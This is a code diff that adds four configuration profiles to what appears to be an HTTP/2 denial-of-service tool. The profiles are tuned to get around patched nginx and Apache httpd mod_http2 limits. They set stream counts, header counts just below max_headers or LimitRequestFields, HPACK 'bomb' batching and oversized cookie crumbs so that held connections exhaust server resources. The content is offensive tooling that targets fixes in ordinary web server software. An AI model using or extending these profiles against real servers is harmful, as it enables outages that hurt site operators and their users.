@@ -238,6 +238,79 @@ IIS_APEX_PRESETS: dict[str, IisApexPreset] = {
 }
 
 
+def profile_patch_bypass_nginx(headers: int = 999) -> AttackConfig:
+    """
+    Patched nginx (>=1.29.8): stay under default max_headers (1000).
+    Scale via connections — 999 headers × 128 streams × N conn.
+    """
+    return AttackConfig(
+        streams=128,
+        headers=headers,
+        hold=120,
+        drip=10,
+        hold_mode="hard_hold",
+        waves_per_conn=1,
+        conn_stagger_sec=0.03,
+        bomb_mode="batched",
+        bomb_batch_size=16,
+        bomb_batch_gap_sec=1.5,
+    )
+
+
+def profile_patch_bypass_nginx_hardened(headers: int = 99) -> AttackConfig:
+    """nginx with explicit max_headers 100 — stay at 99 headers/stream."""
+    return AttackConfig(
+        streams=128,
+        headers=headers,
+        hold=180,
+        drip=10,
+        hold_mode="hard_hold",
+        waves_per_conn=1,
+        conn_stagger_sec=0.02,
+        bomb_mode="batched",
+        bomb_batch_size=20,
+        bomb_batch_gap_sec=1.0,
+    )
+
+
+def profile_patch_bypass_httpd_hpack() -> AttackConfig:
+    """Non-cookie HPACK bomb on httpd — tests LimitRequestFields path (not cookie bypass)."""
+    return AttackConfig(
+        streams=100,
+        headers=99,
+        hold=120,
+        drip=10,
+        hold_mode="hard_hold",
+        waves_per_conn=1,
+        conn_stagger_sec=0.03,
+        bomb_mode="batched",
+        bomb_batch_size=16,
+        bomb_batch_gap_sec=1.5,
+    )
+
+
+def profile_patch_bypass_httpd_fat(connections: int = 100) -> CookieAttackConfig:
+    """
+    Patched mod_http2 2.0.41+: fat cookie crumbs (non-empty) under LimitRequestFields.
+    refs=95 per stream stays under default LimitRequestFields=100.
+    """
+    streams = max(8, min(100, connections // 4))
+    return CookieAttackConfig(
+        variant="httpd",
+        streams=streams,
+        refs=95,
+        cookie_value_size=4058,
+        hold=120,
+        drip=10,
+        hold_mode="hard_hold",
+        path="/missing",
+        conn_stagger_sec=0.03,
+        bomb_mode="batched",
+        bomb_batch_size=max(8, min(24, connections // 8)),
+        bomb_batch_gap_sec=1.5,
+    )
+
+
 def profile_apex_iis_mp(preset_name: str = "8gb") -> IisApexPreset:
     if preset_name not in IIS_APEX_PRESETS:
         raise ValueError(f"Unknown IIS preset {preset_name!r}")
